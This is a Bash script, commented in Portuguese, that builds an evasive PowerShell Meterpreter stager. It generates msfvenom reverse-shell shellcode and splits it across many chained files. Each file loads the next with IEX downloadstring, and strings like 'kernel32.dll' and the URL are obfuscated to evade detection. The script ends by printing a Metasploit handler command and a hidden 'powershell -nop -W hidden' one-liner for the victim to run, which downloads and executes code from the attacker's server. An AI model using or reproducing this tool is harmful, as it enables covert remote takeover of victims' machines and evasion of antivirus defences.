#!/bin/bash
clear
echo "########################################"
echo "#                                      #"
echo "#  GERADOR DE PAYLOAD EM POWERSHELL    #"
echo "#                                      #"
echo "########################################"

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

echo ""

dir="tmp"
if [[ ! -e $dir ]]; then
    mkdir $dir
fi
rm -rf $dir/*

read -p "Payload de conexão reversa: [windows/x64/meterpreter/reverse_https]: " payload
payload=${payload:-windows/x64/meterpreter/reverse_https}

read -p "Endereço do atacante para conexao reversa [192.168.25.9]: " ip
ip=${ip:-192.168.25.9}

read -p "Porta [443]: " porta
porta=${porta:-443}

read -p "URL de acesso ao script principal: [http://$ip/shell.txt]: " url
url=${url:-http://$ip/shell.txt}

read -p "Número de arquivos que o shellcode será divido: [30]: " numero
numero=${numero:-30}

read -p "Timeout entre requisições: [3000]: " timeout
timeout=${timeout:-3000}
echo ""

echo "Gerando payload $payload com o msfvenom. Aguarde... "
msfvenom -p $payload LHOST=$ip LPORT=$porta -f psh -o tmp/shellcode  > /dev/null 2> /dev/null
echo ""

# Nome do script principal
shell_name=$(echo $url | rev | cut -d"/" -f1 | rev)

# Aplica concatenção na URL capturada
url=$(echo $url | sed "s/http/ht'+'tp/g" | sed "s/:\//:'+'\/'+'/g" | sed "s/\./'+'\.'+'/g")

# Captura a URL base
url_base=$(echo $url | grep -o '^.*/')

# Inicia criação do script principal
echo "Start-Sleep -milliseconds $timeout" > tmp/$shell_name
echo "IEX((new-object net.webclient).downloadstring('$url_base""start1.txt'));" >> tmp/$shell_name

# Primeiro código
echo "Start-Sleep -milliseconds $timeout" > tmp/start1.txt
head -6 tmp/shellcode | sed 's/kernel32.dll/ke"+"rnel"+"32."+"d"+"ll/g' >> tmp/start1.txt
echo "IEX((new-object net.webclient).downloadstring('$url_base""start2.txt'));" >> tmp/start1.txt

# Segundo código
echo "Start-Sleep -milliseconds $timeout" > tmp/start2.txt
cat tmp/shellcode | grep "Win32Functions" >> tmp/start2.txt
echo "IEX((new-object net.webclient).downloadstring('$url_base""s1.txt'));" >> tmp/start2.txt

# Captura nome da variável do shellcode
var=$(cat tmp/shellcode | grep "[Byte[]]" | cut -d" " -f2)

# Inicia criação dos arquivos do shellcode
echo "[Byte[]] $var = " > tmp/t1.txt

# Captura shellcode
shellcode=$(cat tmp/shellcode | grep "[Byte[]]" | cut -d" " -f4)

# Cria array de bytes do shellcode
IFS=', ' read -r -a array <<< "$shellcode"
total="${#array[@]}"

# Variáveis utilizadas no loop
parte=$(expr $total / $numero)
acumulador=1
currentFile=$parte

echo "O shellcode será divido a cada $parte bytes.."
echo ""

# Percorre byte a byte o shellcode
for index in "${!array[@]}"
do		
	nextIndex=$(expr $index \+ 1)
	
	# Controla quando se deve criar um novo arquivo
	if [ $index -lt $currentFile ];
	then		
		# Se for o último byte
		if [ "${array[index+1]}" == "" ];
		then
			# Finaliza arquivo do shellcode 
			echo "${array[index]}" >> tmp/t$acumulador.txt	
			cat tmp/t$acumulador.txt | paste -sd "" > tmp/s$acumulador.txt 
			rm tmp/t$acumulador.txt	
			echo "Último arquivo do shellcode tmp/s$acumulador.txt criado..."		
			echo ""
			
			# Manda carregar o script final
			echo "Start-Sleep -milliseconds $timeout" >> tmp/s$acumulador.txt
			echo "IEX((new-object net.webclient).downloadstring('$url_base""last1.txt'));" >> tmp/s$acumulador.txt		
		else	
			# Se o próximo byte dizer parte desse mesmo arquivo
			#if [ $nextIndex -lt $currentFile ];
			#then				
				echo "${array[index]}," >> tmp/t$acumulador.txt
			#else
				#echo "${array[index]}" >> tmp/t$acumulador.txt				
			#fi
			
		fi
	else			
		# Finaliza arquivo do shellcode
		novo_aculumador=$(expr $acumulador \+ 1)				
		cat tmp/t$acumulador.txt | paste -sd "" | sed 's/\(.*\),/\1 /' > tmp/s$acumulador.txt 		
		rm tmp/t$acumulador.txt 
		echo "Arquivo tmp/s$acumulador.txt criado..."		
		
		# Manda carregar o próximo arquivo
		echo "Start-Sleep -milliseconds $timeout" >> tmp/s$acumulador.txt
		echo "IEX((new-object net.webclient).downloadstring('$url_base""s$novo_aculumador.txt'));" >> tmp/s$acumulador.txt
		
		((acumulador++))
		currentFile=$((parte*acumulador))
		
		# Começa a inserir os bytes do shellcode no novo arquivo
		echo "$var += ${array[index]}," >> tmp/t$acumulador.txt			
	fi	
done

# Cria os últimos scripts
cat tmp/shellcode | grep "::VirtualAlloc" > tmp/last1.txt
echo "Start-Sleep -milliseconds $timeout" >> tmp/last1.txt
echo "IEX((new-object net.webclient).downloadstring('$url_base""last2.txt'));" >> tmp/last1.txt
cat tmp/shellcode | grep "System.Runtime.InteropServices.Marshal" > tmp/last2.txt
echo "Start-Sleep -milliseconds $timeout" >> tmp/last2.txt
echo "IEX((new-object net.webclient).downloadstring('$url_base""last3.txt'));" >> tmp/last2.txt
cat tmp/shellcode | grep "::CreateThread" > tmp/last3.txt


printf "${GREEN}Processo finalizado!${NC} os arquivos ${RED}$shell_name e s*.txt${NC} foram gerados no diretório ${RED}tmp${NC}. Você deve subir esses arquivos em algum servidor WEB acessível pela vitima.\n"
printf "O arquivo ${RED}$shell_name${NC} será o primeiro a ser carregado.\n"
echo ""
echo "Inicie o metasploist no atacante com esse comando: "
printf "${RED}msfconsole -x \"use exploit/multi/handler; set payload $payload; set lhost $ip; set lport $porta; set exitonsession false; exploit -j;\"${NC}"
echo ""
echo ""
echo "A vitima deve executar o seguinte comando: "
printf "${RED}powershell -nop -noe -W hidden -C \"IEX((new-object net.webclient).downloadstring('$url'));\"${NC}"

rm tmp/shellcode











